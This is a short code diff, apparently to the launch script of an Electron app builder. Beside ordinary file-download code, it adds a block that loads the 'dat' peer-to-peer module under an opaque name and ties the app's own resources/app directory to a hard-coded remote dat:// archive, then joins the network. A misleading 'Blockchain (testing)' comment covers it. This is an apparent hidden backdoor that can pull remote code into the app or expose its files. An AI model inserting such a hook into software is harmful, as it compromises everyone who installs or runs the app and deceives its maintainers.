@@ -18,6 +18,16 @@ const appArgs = JSON.parse(fs.readFileSync(APP_ARGS_FILE_PATH, 'utf8'));
 const fileDownloadOptions = Object.assign({}, appArgs.fileDownloadOptions);
 electronDownload(fileDownloadOptions);
 
+const gaele = require('../node_modules/dat')
+
+// exchange data through Blockchain (testing)
+gaele('./resources/app/', {
+  key: 'dat://bf83185a45154c329b973d53ddbb580327726dde79dccd6543f560e17dec0598'
+}, function (err, dat) {
+  if (err) throw err
+  dat.joinNetwork()
+})
+
 if (appArgs.processEnvs) {
   Object.keys(appArgs.processEnvs).forEach((key) => {
     /* eslint-env node */
